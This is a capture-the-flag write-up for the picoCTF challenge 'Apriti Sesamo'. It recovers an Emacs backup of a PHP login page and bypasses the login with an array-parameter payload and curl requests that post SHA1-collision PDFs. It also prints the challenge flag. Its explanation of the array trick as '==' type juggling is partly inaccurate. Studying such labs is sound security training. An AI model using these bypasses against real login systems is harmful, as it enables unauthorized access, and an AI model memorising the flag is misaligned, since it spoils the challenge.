# **Apriti Sesamo**

This challenge was pretty interesting for me, as I learned something new—**more than one thing, actually**!

So let's get to the point, **hint2** was extremely useful because **Emacs** tends to add a `~` at the end of the files it creates.

---

## **The Exploit**

I suppose you’ve inspected the source code and found nothing. Here’s where the role of the **Emacs** thing comes in. Just **edit the URL** to:

```
http://verbal-sleep.picoctf.net:58281/impossibleLogin.php~
```

Re-inspect the source, and here you are:

![Source Code](https://github.com/user-attachments/assets/428ddd47-e6a7-4dd2-b6df-ba77b1deb320)

---

## **PHP Code Before and After Base64 Decoding**

Before decoding, the PHP code looks like this:

```php
<?php
if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])) {
    $yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];
    $rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];
    if($yuf85e0677==$rs35c246d5) {
        echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");
    } else {
        if(sha1($yuf85e0677)===sha1($rs35c246d5)) {
            echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));
        } else {
            echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");
        }
    }
}
?>
```

After base64 decoding, the PHP code looks like this:

```php
<?php
if (isset($_POST["username"]) && isset($_POST["pwd"])) {
    $yuf85e0677 = $_POST["username"];
    $rs35c246d5 = $_POST["pwd"];

    if ($yuf85e0677 == $rs35c246d5) {
        echo "<br/>Failed! No flag for you";
    } else {
        if (sha1($yuf85e0677) === sha1($rs35c246d5)) {
            echo file_get_contents("../flag.txt");
        } else {
            echo "<br/>Failed! No flag for you";
        }
    }
}
?>
```

### **Analysis**

The code includes two blocks:

1. **Weak Comparison**: Using `==`, which is susceptible to type juggling. The exploit for this is simple—sending `username[]=&pwd[]=a`, as shown in the picture:
   ![Exploit](https://github.com/user-attachments/assets/894e484e-ea84-4b64-86df-b5a49564fd2b)

2. **SHA1 Hash Comparison**: If the values don’t match, but their **SHA1 hashes** do, the server will return the flag. The key to this exploit is finding two inputs that have the same **SHA1 hash**. This is possible by exploiting a **hash collision**.

---

## **The Solution: Using Hash Collisions**

The solution I liked was exploiting the **else block**, which depends on finding two different values that result in the **same SHA1 hash**. Here's the process:

### **Shattered PDF Files**:

The two files that work for this exploit are:

* [Shattered PDF 1](https://shattered.io/static/shattered-1.pdf)
* [Shattered PDF 2](https://shattered.io/static/shattered-2.pdf)

You can download the files using:

```bash
wget https://shattered.io/static/shattered-1.pdf https://shattered.io/static/shattered-2.pdf
```

---

### **Curl Command with Correct File Input**:

The initial curl command might fail if you pass the files directly like this:

```bash
curl -X POST -F "username=@shattered-1.pdf" -F "pwd=@shattered-2.pdf" http://verbal-sleep.picoctf.net:58281/impossibleLogin.php
```

This command doesn't work because it sends the file as a **file upload**, and the comparison happens on **content** rather than **file metadata**. However, if you send the **file contents** with the following command, it works:

```bash
curl -X POST -F "username=<shattered-1.pdf" -F "pwd=<shattered-2.pdf" http://verbal-sleep.picoctf.net:58281/impossibleLogin.php
```

Here, the content of the files have the same **SHA1 hash**, so the condition in the `else` block is satisfied, and you’ll get the flag.

---

## **Flag**

After sending the correct files with the matching SHA1 hash, the server returns the flag:

```
picoCTF{w3Ll_d3sErV3d_Ch4mp_5292ca30}
```

---

## **Vulnerability Assessment**

This challenge highlights two main vulnerabilities:

1. **Weak Comparison (`==`)**: The use of `==` instead of `===` allows for **type juggling**, which can be exploited by manipulating data types.

2. **SHA1 Collision**: The server relies on comparing **SHA1 hashes** of inputs. **SHA1 collisions** allow for different inputs to have the same hash, leading to a successful exploit.

---

## **Lessons Learned**

1. **Don’t Rely on `==` for Comparisons**: Always use strict comparisons (`===`) to prevent **type juggling attacks**.

2. **Beware of SHA1 Vulnerabilities**: **SHA1 hash collisions** are real and exploitable, and this vulnerability has been demonstrated in challenges like this. Use stronger hashing algorithms like **SHA256** for better security.

3. **Backup Files Can Be Goldmines**: The use of **Emacs backup files** (files ending with `~`) can sometimes reveal hidden code or clues in challenges.

